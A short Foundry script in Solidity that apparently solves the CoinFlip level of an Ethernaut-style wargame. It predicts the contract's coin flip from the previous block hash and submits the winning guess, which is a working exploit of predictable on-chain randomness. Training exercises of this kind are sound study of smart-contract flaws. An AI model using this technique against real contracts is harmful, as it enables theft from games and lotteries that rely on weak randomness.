// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "src/03/CoinFlip.sol";


contract Exploit is Script {

    address levelInstance = 0x99e32C45080034F63e10Bb03697458b58CDFFceE;
    CoinFlip level = CoinFlip(levelInstance);
    
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function generateSide() internal view returns (bool) {

        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        return side;

     }

    function run() external {

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        bool nextSide = generateSide();
        console.log(nextSide, "side");
        require(level.flip(nextSide), "Guess failed");

       
        console.log(level.consecutiveWins());

        vm.stopBroadcast();
    }
}